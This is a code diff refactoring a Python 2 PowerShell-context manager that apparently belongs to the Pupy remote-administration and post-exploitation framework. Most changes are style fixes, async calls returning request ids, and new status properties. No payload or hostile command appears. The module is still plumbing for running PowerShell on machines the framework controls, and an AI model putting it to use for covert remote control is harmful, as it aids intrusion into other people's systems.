@@ -10,7 +10,6 @@ import re
 import random
 import Queue
 import string
-import codecs
 
 class PowerHostUninitialized(Exception):
     pass
@@ -79,7 +78,7 @@ class Request(object):
     def result(self, value):
         if value:
             if self._continious:
-                if not self._rid in self._storage:
+                if self._rid not in self._storage:
                     self._storage[self._rid] = value
                 else:
                     self._storage[self._rid] += value
@@ -152,7 +151,7 @@ class Powershell(threading.Thread):
 
         preamble_complete = self._random()
 
-        request =  '\n'.join([
+        request = '\n'.join([
             '[Console]::OutputEncoding = [System.Text.Encoding]::UTF8',
             '$OutputEncoding = [Console]::OutputEncoding',
             'Write-Host {}'.format(preamble_complete)
@@ -168,7 +167,7 @@ class Powershell(threading.Thread):
             self.stop()
             raise PowershellV2NotInstalled()
 
-        elif not data or not preamble_complete in data:
+        elif not data or preamble_complete not in data:
             print "First line: ", repr(data)
             print '.NET Framework is not installed' in data
             self.stop()
@@ -314,7 +313,7 @@ class Powershell(threading.Thread):
             self._queue.put(request)
 
             if async and not wait:
-                return request
+                return request.rid
             else:
                 return request.result
 
@@ -367,6 +366,14 @@ class PowerHost(object):
         self._v2 = True
         self.results = {}
 
+    @property
+    def active(self):
+        return bool(self._powershells)
+
+    @property
+    def dirty(self):
+        return bool(self.results)
+
     def register(self, name, content, force=False, try_x64=False, daemon=False, width=None, v2=None):
         v2 = self._v2 if v2 is None else v2
         if name in self._powershells:
@@ -387,7 +394,7 @@ class PowerHost(object):
             )
 
     def load(self, name, content):
-        if not name in self._powershells:
+        if name not in self._powershells:
             raise PowershellUninitialized()
 
         self._powershells[name].load(content)
@@ -399,14 +406,14 @@ class PowerHost(object):
             return self._powershells.keys()
 
     def unregister(self, name):
-        if not name in self._powershells:
+        if name not in self._powershells:
             raise ValueError('{} is not registered'.format(name))
 
         self._powershells[name].stop
         del self._powershells[name]
 
     def function(self, name, expression):
-        if not name in self._powershells:
+        if name not in self._powershells:
             raise ValueError('{} is not registered'.format(name))
 
         return lambda: self._powershells[name].execute(
@@ -414,7 +421,7 @@ class PowerHost(object):
         )
 
     def call(self, name, expression, async=False, timeout=None):
-        if not name in self._powershells:
+        if name not in self._powershells:
             raise ValueError('{} is not registered'.format(name))
 
         return self._powershells[name].execute(expression, async, timeout)
@@ -435,10 +442,6 @@ class PowerHost(object):
     @property
     def name(self):
         return type(self).__name__
-
-    @property
-    def dirty(self):
-        return False
 
     @property
     def stopped(self):
@@ -484,7 +487,11 @@ def call(name, expression, async=False, timeout=None, content=None, try_x64=Fals
         load(name, content, force=True, try_x64=try_x64)
 
     try:
-        return powershell.call(name, expression, async, timeout)
+        result = powershell.call(name, expression, async, timeout)
+        if async:
+            return result.rid
+        else:
+            return result
 
     finally:
         if content:
@@ -501,7 +508,7 @@ def result(name, rid):
         PowershellContextUnregistered()
 
     results = powershell.results
-    if not name in results or not rid in results[name]:
+    if name not in results or rid not in results[name]:
         return None
 
     result = results[name][rid]
@@ -509,8 +516,7 @@ def result(name, rid):
 
     return result
 
-@property
-def results():
+def get_results():
     powershell = pupy.manager.get(PowerHost)
     if not powershell:
         raise PowerHostUninitialized()
@@ -518,6 +524,10 @@ def results():
     return {
         ctx:results.keys() for ctx, results in powershell.results.iteritems()
     }
+
+@property
+def results():
+    return get_results()
 
 def stop():
     pupy.manager.stop(PowerHost)
